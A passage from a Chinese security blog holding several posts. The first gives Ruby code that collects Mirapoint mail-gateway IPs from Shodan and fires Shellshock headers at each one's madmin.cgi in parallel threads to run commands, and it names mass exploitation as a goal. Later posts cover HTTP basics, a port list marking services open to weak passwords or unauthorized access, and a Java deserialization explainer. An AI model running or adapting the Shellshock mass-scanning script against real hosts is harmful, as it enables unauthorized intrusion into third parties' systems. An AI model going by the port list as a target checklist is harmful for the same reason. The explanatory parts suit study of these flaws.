class="line"></div><div class="line">            url = site + <span class="string">"/search?num="</span> + page_count.to_s + <span class="string">"&amp;q="</span> + CGI::escape(@query)</div><div class="line">        <span class="keyword">end</span> <span class="keyword">while</span> result_count &lt; stop.to_i</div><div class="line"></div><div class="line">        @result.uniq!</div><div class="line">    <span class="keyword">end</span></div><div class="line"></div><div class="line">    private</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_result</span><span class="params">(body)</span></span></div><div class="line">        html_doc = Nokogiri::HTML(body)</div><div class="line">        urls = []</div><div class="line"></div><div class="line">        html_doc.css(<span class="string">"li[class='g'] h3[class='r'] a"</span>).each <span class="keyword">do</span> <span class="params">|url|</span></div><div class="line">            urls &lt;&lt; url[<span class="string">'href'</span>].match(<span class="regexp">/(https?:\/\/[^\/]*)\//</span>)[<span class="number">1</span>]</div><div class="line">        <span class="keyword">end</span></div><div class="line"></div><div class="line">        urls</div><div class="line">    <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">puts <span class="string">'[*] Searching Google ...'</span></div><div class="line"></div><div class="line">google = Google.new(<span class="string">'inurl:/cgi-bin/madmin.cgi'</span>, <span class="string">'127.0.0.1:8081'</span>))</div><div class="line">result = google.search(<span class="number">50</span>)</div></pre></td></tr></table></figure>
<p>这样我们就能够批量从google中获取搜索结果了</p>
<hr>
<h2 id="0x02-利用Shodan"><a href="#0x02-利用Shodan" class="headerlink" title="0x02 利用Shodan"></a>0x02 利用Shodan</h2><p><a href="https://www.shodan.io/" target="_blank" rel="external">Shodan</a>（撒旦）可以说是一款“黑暗”谷歌，一刻不停的在寻找着所有和互联网关联的服务器、摄像头、打印机、路由器等等。每个月Shodan都会在大约5亿个服务器上日夜不停地搜集信息。</p>
<p><img src="/upload_image/Dashuju-3.jpg" alt=""></p>
<p>与谷歌不同的是，Shodan不是在网上搜索网址，而是直接进入互联网的背后通道。</p>
<p>Shodan所搜集到的信息是极其惊人的。凡是链接到互联网的红绿灯、安全摄像头、家庭自动化设备以及加热系统等等都会被轻易的搜索到。</p>
<p>Shodan的使用者曾发现过一个水上公园的控制系统，一个加油站，甚至一个酒店的葡萄酒冷却器。而网站的研究者也曾使用Shodan定位到了核电站的指挥和控制系统及一个粒子回旋加速器。</p>
<p>Shodan真正值得注意的能力就是能找到几乎所有和互联网相关联的东西。而Shodan真正的可怕之处就是这些设备几乎都没有安装安全防御措施，其可以随意进入。</p>
<p>Shodan的开发者给我们带来大量数据的同时，也提供了友好的接口供我们查询，比如Ruby就有一个gem包名为Shodan，通过这个包，我们可以方便的查询Shodan的数据。</p>
<p>具体的开发文档可以看<a href="https://developer.shodan.io/" target="_blank" rel="external">这里</a></p>
<p>这里说一下API，默认用户的API KEY只能有100次查询限制，每次查询最多只能获得100个结果，除非去购买付费计划：</p>
<p><img src="/upload_image/Dashuju-4.jpg" alt=""></p>
<p>下面我们同样以mirapoint邮件网关来搜索下：</p>
<p><img src="/upload_image/Dashuju-5.jpg" alt=""></p>
<p>Shodan按国家和地区将搜索结果进行分类。</p>
<p>我们调用接口来试试：</p>
<p>它的使用方法很简单，首先创建一个<strong>Shodan::Shodan</strong>的实例对象：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">api = Shodan::Shodan.new(api_key)</div></pre></td></tr></table></figure>
<p>然后再调用对象的<strong>search</strong>方法进行搜索就可以了：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">result = api.search(qury)</div></pre></td></tr></table></figure>
<p>实际测试（使用mirapoint邮件网关的bash漏洞）：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">require</span> <span class="string">'net/http'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'json'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'base64'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'cgi'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'typhoeus'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'shodan'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_targets_from_shodan</span><span class="params">(query=<span class="string">''</span>, key=<span class="string">'XXXXXXXXXXXXXXXXXXX'</span>)</span></span></div><div class="line">  result = []</div><div class="line">  api = Shodan::Shodan.new key</div><div class="line">  search_result = api.search(query)</div><div class="line">  search_result[<span class="string">'matches'</span>].each <span class="keyword">do</span> <span class="params">|host|</span></div><div class="line">    result &lt;&lt; host[<span class="string">'ip_str'</span>]</div><div class="line">  <span class="keyword">end</span></div><div class="line"></div><div class="line">  result</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack_target</span><span class="params">(<span class="symbol">target:</span> <span class="literal">nil</span>, <span class="symbol">cmd:</span> <span class="string">'/usr/bin/id'</span>)</span></span></div><div class="line">  target &lt;&lt; <span class="string">'/cgi-bin/madmin.cgi'</span></div><div class="line">  exp = <span class="string">'() &#123; :; &#125;; echo `echo X-Bash: test`;'</span></div><div class="line">  response = Typhoeus.get(target, <span class="symbol">headers:</span> &#123;<span class="string">'test'</span> =&gt; exp&#125;)</div><div class="line"></div><div class="line">  <span class="keyword">if</span> response.headers.has_key? <span class="string">'X-Bash'</span></div><div class="line">    response = Typhoeus.get(target, <span class="symbol">headers:</span> &#123;<span class="string">'test'</span> =&gt; <span class="string">"() &#123; :; &#125;; echo; echo just4fun; echo `<span class="subst">#&#123;cmd&#125;</span>`; echo nuf4tsuj;"</span>&#125;)</div><div class="line">    result = response.body.scan(<span class="regexp">/just4fun\n(.*)\nnuf4tsuj/m</span>)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> result.is_a? Array</div><div class="line">      result[<span class="number">0</span>]</div><div class="line">    <span class="keyword">else</span></div><div class="line">      <span class="literal">false</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  <span class="keyword">else</span></div><div class="line">    <span class="literal">false</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"></div><div class="line">query = <span class="string">'mirapoint'</span></div><div class="line">targets = get_targets_from_shodan(query)</div><div class="line"></div><div class="line">puts <span class="string">"[*] Result total: <span class="subst">#&#123;targets.size&#125;</span>"</span></div><div class="line"></div><div class="line">threads = []</div><div class="line">targets.each <span class="keyword">do</span> <span class="params">|target|</span></div><div class="line">  threads &lt;&lt; Thread.new &#123;</div><div class="line">    result = attack_target(<span class="symbol">target:</span> target)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> result</div><div class="line">      puts <span class="string">"[+] <span class="subst">#&#123;target&#125;</span>"</span></div><div class="line">      puts <span class="string">"[*] <span class="subst">#&#123;result[<span class="number">0</span>]&#125;</span>"</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  &#125;</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">threads.each &#123;<span class="params">|thr|</span> thr.join&#125;</div></pre></td></tr></table></figure>
<p>结果：</p>
<p><img src="/upload_image/Dashuju-6.jpg" alt=""></p>
<hr>
<h2 id="0x04-总结-amp-amp-展望"><a href="#0x04-总结-amp-amp-展望" class="headerlink" title="0x04 总结 &amp;&amp; 展望"></a>0x04 总结 &amp;&amp; 展望</h2><p>这些利用大数据进行攻击的目的其实有两个：</p>
<ol>
<li>检测漏洞修复率</li>
<li>批量利用漏洞进行攻击</li>
</ol>
<p>目前来说，上面这两种方法都不能够获取到万级以上的数据，毕竟数据都是要钱来买的，所以我们才要自己建立一个指纹识别引擎，不管是检测漏洞也好还是利用漏洞也好，没有数据的话什么都不能开展。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2017/01/15/利用大数据进行攻击/" data-id="cjbohpb4l000f7o1bgwx3g83m" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-HTTP-协议" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/12/23/HTTP-协议/" class="article-date">
  <time datetime="2016-12-23T05:15:58.000Z" itemprop="datePublished">2016-12-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/12/23/HTTP-协议/">HTTP 协议</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a href="https://www.jianshu.com/p/80e25cb1d81a" target="_blank" rel="external">转</a></p>
<h4 id="详解URL的组成"><a href="#详解URL的组成" class="headerlink" title="详解URL的组成"></a>详解URL的组成</h4><p>就以下面这个URL为例，介绍下普通URL的各部分组成</p>
<p><a href="http://www.aspxfans.com:8080/news/index.asp?boardID=5&amp;ID=24618&amp;page=1#name" target="_blank" rel="external">http://www.aspxfans.com:8080/news/index.asp?boardID=5&amp;ID=24618&amp;page=1#name</a><br>从上面的URL可以看出，一个完整的URL包括以下几部分：<br><strong>1.</strong>协议部分：该URL的协议部分为“http：”，这代表网页使用的是HTTP协议。在Internet中可以使用多种协议，如HTTP，FTP等等本例中使用的是HTTP协议。在”HTTP”后面的“//”为分隔符</p>
<p><strong>2.</strong>域名部分：该URL的域名部分为“www.aspxfans.com”。一个URL中，也可以使用IP地址作为域名使用</p>
<p><strong>3.</strong>端口部分：跟在域名后面的是端口，域名和端口之间使用“:”作为分隔符。端口不是一个URL必须的部分，如果省略端口部分，将采用默认端口</p>
<p><strong>4.</strong>虚拟目录部分：从域名后的第一个“/”开始到最后一个“/”为止，是虚拟目录部分。虚拟目录也不是一个URL必须的部分。本例中的虚拟目录是“/news/”</p>
<p><strong>5.</strong>文件名部分：从域名后的最后一个“/”开始到“？”为止，是文件名部分，如果没有“?”,则是从域名后的最后一个“/”开始到“#”为止，是文件部分，如果没有“？”和“#”，那么从域名后的最后一个“/”开始到结束，都是文件名部分。本例中的文件名是“index.asp”。文件名部分也不是一个URL必须的部分，如果省略该部分，则使用默认的文件名</p>
<p><strong>6.</strong>锚部分：从“#”开始到最后，都是锚部分。本例中的锚部分是“name”。锚部分也不是一个URL必须的部分</p>
<p><strong>7.</strong>参数部分：从“？”开始到“#”为止之间的部分为参数部分，又称搜索部分、查询部分。本例中的参数部分为“boardID=5&amp;ID=24618&amp;page=1”。参数可以允许有多个参数，参数与参数之间用“&amp;”作为分隔符。</p>
<h4 id="URI和URL的区别"><a href="#URI和URL的区别" class="headerlink" title="URI和URL的区别"></a>URI和URL的区别</h4><p>URI ，是uniform resource identifier，统一资源标识符，用来唯一的标识一个资源。<br>Web上可用的每种资源如HTML文档、图像、视频片段、程序等都是一个来URI来定位的<br>URI一般由三部组成：<br>①访问资源的命名机制<br>②存放资源的主机名<br>③资源自身的名称，由路径表示，着重强调于资源。</p>
<p>URL是uniform resource locator，统一资源定位器，它是一种具体的URI，即URL可以用来标识一个资源，而且还指明了如何locate这个资源。<br>URL是Internet上用来描述信息资源的字符串，主要用在各种WWW客户程序和服务器程序上，特别是著名的Mosaic。<br>采用URL可以用一种统一的格式来描述各种信息资源，包括文件、服务器的地址和目录等。URL一般由三部组成：<br>①协议(或称为服务方式)<br>②存有该资源的主机IP地址(有时也包括端口号)<br>③主机资源的具体地址。如目录和文件名等</p>
<p>URN，uniform resource name，统一资源命名，是通过名字来标识资源，比如mailto:java-net@java.sun.com。<br>URI是以一种抽象的，高层次概念定义统一资源标识，而URL和URN则是具体的资源标识的方式。URL和URN都是一种URI。笼统地说，每个 URL 都是 URI，但不一定每个 URI 都是 URL。这是因为 URI 还包括一个子类，即统一资源名称 (URN)，它命名资源但不指定如何定位资源。上面的 mailto、news 和 isbn URI 都是 URN 的示例。</p>
<p>在Java的URI中，一个URI实例可以代表绝对的，也可以是相对的，只要它符合URI的语法规则。而URL类则不仅符合语义，还包含了定位该资源的信息，因此它不能是相对的。<br>在Java类库中，URI类不包含任何访问资源的方法，它唯一的作用就是解析。<br>相反的是，URL类可以打开一个到达资源的流。</p>
<h4 id="HTTP之请求消息Request"><a href="#HTTP之请求消息Request" class="headerlink" title="HTTP之请求消息Request"></a>HTTP之请求消息Request</h4><p>客户端发送一个HTTP请求到服务器的请求消息包括以下格式：</p>
<h5 id="请求行（request-line）、请求头部（header）、空行和请求数据四个部分组成。"><a href="#请求行（request-line）、请求头部（header）、空行和请求数据四个部分组成。" class="headerlink" title="请求行（request line）、请求头部（header）、空行和请求数据四个部分组成。"></a>请求行（request line）、请求头部（header）、空行和请求数据四个部分组成。</h5><ul>
<li><p>请求行以一个方法符号开头，以空格分开，后面跟着请求的URI和协议的版本。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">GET /562f25980001b1b106000338.jpg HTTP/1.1</div><div class="line">Host    img.mukewang.com</div><div class="line">User-Agent  Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36</div><div class="line">Accept  image/webp,image/*,*/*;q=0.8</div><div class="line">Referer http://www.imooc.com/</div><div class="line">Accept-Encoding gzip, deflate, sdch</div><div class="line">Accept-Language zh-CN,zh;q=0.8</div></pre></td></tr></table></figure>
</li>
</ul>
<p>第一部分：请求行，用来说明请求类型,要访问的资源以及所使用的HTTP版本.<br>GET说明请求类型为GET,[/562f25980001b1b106000338.jpg]为要访问的资源，该行的最后一部分说明使用的是HTTP1.1版本。<br>第二部分：请求头部，紧接着请求行（即第一行）之后的部分，用来说明服务器要使用的附加信息<br>从第二行起为请求头部，HOST将指出请求的目的地.User-Agent,服务器端和客户端脚本都能访问它,它是浏览器类型检测逻辑的重要基础.该信息由你的浏览器来定义,并且在每个请求中自动发送等等<br>第三部分：空行，请求头部后面的空行是必须的<br>即使第四部分的请求数据为空，也必须有空行。<br>第四部分：请求数据也叫主体，可以添加任意的其他数据。<br>这个例子的请求数据为空。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">POST / HTTP1.1</div><div class="line">Host:www.wrox.com</div><div class="line">User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)</div><div class="line">Content-Type:application/x-www-form-urlencoded</div><div class="line">Content-Length:40</div><div class="line">Connection: Keep-Alive</div><div class="line"></div><div class="line">name=Professional%20Ajax&amp;publisher=Wiley</div></pre></td></tr></table></figure>
<p>第一部分：请求行，第一行明了是post请求，以及http1.1版本。<br>第二部分：请求头部，第二行至第六行。<br>第三部分：空行，第七行的空行。<br>第四部分：请求数据，第八行。</p>
<h4 id="HTTP之响应消息Response"><a href="#HTTP之响应消息Response" class="headerlink" title="HTTP之响应消息Response"></a>HTTP之响应消息Response</h4><h5 id="HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。"><a href="#HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。" class="headerlink" title="HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。"></a>HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。</h5><p><img src="https://upload-images.jianshu.io/upload_images/2964446-1c4cab46f270d8ee.jpg?imageMogr2/auto-orient/" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">第一部分：状态行，由HTTP协议版本号， 状态码， 状态消息 三部分组成。</div><div class="line">第一行为状态行，（HTTP/1.1）表明HTTP版本为1.1版本，状态码为200，状态消息为（ok）</div><div class="line">第二部分：消息报头，用来说明客户端要使用的一些附加信息</div><div class="line">第二行和第三行为消息报头，</div><div class="line">Date:生成响应的日期和时间；Content-Type:指定了MIME类型的HTML(text/html),编码类型是UTF-8</div><div class="line">第三部分：空行，消息报头后面的空行是必须的</div><div class="line">第四部分：响应正文，服务器返回给客户端的文本信息。</div><div class="line">空行后面的html部分为响应正文。</div></pre></td></tr></table></figure>
<h4 id="HTTP之状态码"><a href="#HTTP之状态码" class="headerlink" title="HTTP之状态码"></a>HTTP之状态码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">状态代码有三位数字组成，第一个数字定义了响应的类别，共分五种类别:</div><div class="line">1xx：指示信息--表示请求已接收，继续处理</div><div class="line">2xx：成功--表示请求已被成功接收、理解、接受</div><div class="line">3xx：重定向--要完成请求必须进行更进一步的操作</div><div class="line">4xx：客户端错误--请求有语法错误或请求无法实现</div><div class="line">5xx：服务器端错误--服务器未能实现合法的请求</div></pre></td></tr></table></figure>
<h4 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h4><p>根据HTTP标准，HTTP请求可以使用多种请求方法。<br>HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。<br>HTTP1.1新增了五种请求方法：OPTIONS, PUT, DELETE, TRACE 和 CONNECT 方法。</p>
<h4 id="HTTP工作原理"><a href="#HTTP工作原理" class="headerlink" title="HTTP工作原理"></a>HTTP工作原理</h4><p>HTTP协议定义Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。HTTP协议采用了请求/响应模型。客户端向服务器发送一个请求报文，请求报文包含请求的方法、URL、协议版本、请求头部和请求数据。服务器以一个状态行作为响应，响应的内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。</p>
<p>以下是 HTTP 请求/响应的步骤：</p>
<p>1、客户端连接到Web服务器<br>一个HTTP客户端，通常是浏览器，与Web服务器的HTTP端口（默认为80）建立一个TCP套接字连接。例如，<a href="http://www.oakcms.cn。" target="_blank" rel="external">http://www.oakcms.cn。</a></p>
<p>2、发送HTTP请求<br>通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据4部分组成。</p>
<p>3、服务器接受请求并返回HTTP响应<br>Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。一个响应由状态行、响应头部、空行和响应数据4部分组成。</p>
<p>4、释放连接TCP连接<br>若connection 模式为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接;若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求;</p>
<p>5、客户端浏览器解析HTML内容<br>客户端浏览器首先解析状态行，查看表明请求是否成功的状态代码。然后解析每一个响应头，响应头告知以下为若干字节的HTML文档和文档的字符集。客户端浏览器读取响应数据HTML，根据HTML的语法对其进行格式化，并在浏览器窗口中显示。</p>
<p>例如：在浏览器地址栏键入URL，按下回车之后会经历以下流程：</p>
<p>1、浏览器向 DNS 服务器请求解析该 URL 中的域名所对应的 IP 地址;</p>
<p>2、解析出 IP 地址后，根据该 IP 地址和默认端口 80，和服务器建立TCP连接;</p>
<p>3、浏览器发出读取文件(URL 中域名后面部分对应的文件)的HTTP 请求，该请求报文作为 TCP 三次握手的第三个报文的数据发送给服务器;</p>
<p>4、服务器对浏览器请求作出响应，并把对应的 html 文本发送给浏览器;</p>
<p>5、释放 TCP连接;</p>
<p>6、浏览器将该 html 文本并显示内容;</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2016/12/23/HTTP-协议/" data-id="cjbohpb4700057o1boafcxikg" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-端口大集合" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/12/04/端口大集合/" class="article-date">
  <time datetime="2016-12-04T02:24:31.000Z" itemprop="datePublished">2016-12-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/12/04/端口大集合/">端口大集合</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>###1,web类(web漏洞/敏感目录)<br>第三方通用组件漏洞struts thinkphp jboss ganglia zabbix<br>80 web<br>80-89 web<br>8000-9090 web</p>
<p>###2,数据库类(扫描弱口令)<br>1433 MSSQL<br>1521 Oracle<br>3306 MySQL<br>5432 PostgreSQL</p>
<p>###3,特殊服务类(未授权/命令执行类/漏洞)<br>443 SSL心脏滴血<br>873 Rsync未授权<br>5984 CouchDB <a href="http://xxx:5984/_utils/" target="_blank" rel="external">http://xxx:5984/_utils/</a><br>6379 redis未授权<br>7001,7002 WebLogic默认弱口令，反序列<br>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞<br>11211 memcache未授权访问<br>27017,27018 Mongodb未授权访问<br>50000 SAP命令执行<br>50070,50030 hadoop默认端口未授权访问</p>
<p>###4,常用端口类(扫描弱口令/端口爆破)<br>21 ftp<br>22 SSH<br>23 Telnet<br>2601,2604 zebra路由，默认密码zebra<br>3389 远程桌面<br>端口合计详情<br>21 ftp<br>22 SSH<br>23 Telnet<br>80 web<br>80-89 web<br>161 SNMP<br>389 LDAP<br>443 SSL心脏滴血以及一些web漏洞测试<br>445 SMB<br>512,513,514 Rexec<br>873 Rsync未授权<br>1025,111 NFS<br>1433 MSSQL<br>1521 Oracle:(iSqlPlus Port:5560,7778)<br>2082/2083 cpanel主机管理系统登陆 （国外用较多）<br>2222 DA虚拟主机管理系统登陆 （国外用较多）<br>2601,2604 zebra路由，默认密码zebra<br>3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了<br>3306 MySQL<br>3312/3311 kangle主机管理系统登陆<br>3389 远程桌面<br>4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网<br>5432 PostgreSQL<br>5900 vnc<br>5984 CouchDB <a href="http://xxx:5984/_utils/" target="_blank" rel="external">http://xxx:5984/_utils/</a><br>6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网<br>6379 redis未授权<br>7001,7002 WebLogic默认弱口令，反序列<br>7778 Kloxo主机控制面板登录<br>8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上<br>8080 tomcat/WDCP主机管理系统，默认弱口令<br>8080,8089,9090 JBOSS<br>8083 Vestacp主机管理系统 （国外用较多）<br>8649 ganglia<br>8888 amh/LuManager 主机管理系统默认端口<br>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞<br>10000 Virtualmin/Webmin 服务器虚拟主机管理系统<br>11211 memcache未授权访问<br>27017,27018 Mongodb未授权访问<br>28017 mongodb统计页面<br>50000 SAP命令执行<br>50070,50030 hadoop默认端口未授权访问</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2016/12/04/端口大集合/" data-id="cjbohpb4q000k7o1btzvtieh8" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="w-Java反序列化漏洞" class="article article-type-w" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/10/10/Java反序列化漏洞/" class="article-date">
  <time datetime="2016-10-10T03:46:54.000Z" itemprop="datePublished">2016-10-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/10/10/Java反序列化漏洞/">序列化和反序列化</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a href="https://xianzhi.aliyun.com/forum/topic/1825/" target="_blank" rel="external">先知链接</a></p>
<h3 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h3><p>序列化：把对象转换为字节序列的过程。<br>反序列化：把字节序列恢复为对象的过程。<br><img src="/upload_image/7.png" alt=""></p>
<h5 id="JDK类库中的序列化API"><a href="#JDK类库中的序列化API" class="headerlink" title="JDK类库中的序列化API"></a>JDK类库中的序列化API</h5><p>java.io.ObjectOutputStream代表对象输出流，它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。<br>　　java.io.ObjectInputStream代表对象输入流，它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。<br><img src="/upload_image/8.png" alt=""><br><strong>在Java中，对象的序列化与反序列化被广泛应用到RMI(远程方法调用)及网络传输中。</strong></p>
<h5 id="Java序列化数据解析"><a href="#Java序列化数据解析" class="headerlink" title="Java序列化数据解析"></a>Java序列化数据解析</h5><p>数据开头为“AC ED 00 05”，数据内容包含了包名与类名、类中包含的变量名称、类型及变量的值。<br><img src="/upload_image/9.png" alt=""><br>ava.io.ObjectStreamConstants类中定义了STREAM_MAGIC与STREAM_VERSION，查看JDK1.5、1.6、1.7、1.8的ObjectStreamConstants类，STREAM_MAGIC值均为0xaced，STREAM_VERSION值均为5。</p>
<h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><p>Breenmachine的这篇blog让java反序列化漏洞得到更多的关注，他介绍了如何利用Java反序列化漏洞，来攻击最新版的WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些大名鼎鼎的Java应用，实现远程代码执行。<br><img src="/upload_image/10.png" alt=""></p>
<h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>如果Java应用对用户输入，即不可信数据没有进行校验而直接做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。</p>
<h3 id="Apache-Commons-Collections"><a href="#Apache-Commons-Collections" class="headerlink" title="Apache Commons Collections"></a>Apache Commons Collections</h3><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。<br>该漏洞的出现的根源在CommonsCollections组件中对于集合的操作存在可以进行反射调用的方法，并且该方法在相关对象反序列化时并未进行任何校验.<br>Apache Commons Collections中提供了一个Transformer的类，这个接口的的功能就是把一个对象转换为另一个对象。<br><img src="/upload_image/11.png" alt=""><br>图上红框标注的是java反序列化漏洞的poc包含的类。<br>invokeTransformer：Transformer implementation that creates a new object instance by reflection.（通过反射，返回一个对象）<br>ChainedTransformer：Transformer implementation that chains the specified transformers together.（把transformer连接成一条链，对一个对象依次通过链条内的每一个transformer进行转换）<br>ConstantTransformer：Transformer implementation that returns the same constant each time.（把一个对象转化为常量，并返回）<br>InvokerTransformer是比较关键的一个类，我们来看看它的实现：<br><img src="/upload_image/18.png" alt=""><br>我们可以看到该该方法中采用了反射的方法进行函数调用，Input参数为要进行反射的对象(反射机制就是可以把一个类,类的成员(函数,属性),当成一个对象来操作,希望读者能理解,也就是说,类,类的成员,我们在运行的时候还可以动态地去操作他们.)，iMethodName,iParamTypes为调用的方法名称以及该方法的参数类型，iArgs为对应方法的参数，在invokeTransformer这个类的构造函数中我们可以发现，这三个参数均为可控参数<br>POC：<br><img src="/upload_image/17.png" alt=""><br>Poc解读：整个poc的逻辑可以这么理解，构建innerMap的键值对，为其赋值，利用Transformed的decorate方法，可以对Map数据结构的key，value进行transform。该方法有三个参数，第一个为待转化的map对象，第二个为map对象内的key要经过的转化方法，第三个参数为map对象内的value要经过的转化方法。<br>TransformedMap.decoreate(目标map，key的转化对象（null或者单个链），value的转化对象)<br>poc对innerMap的value进行转换，当innerMap的value执行完一个完整的转换链，就完成了命令执行。</p>
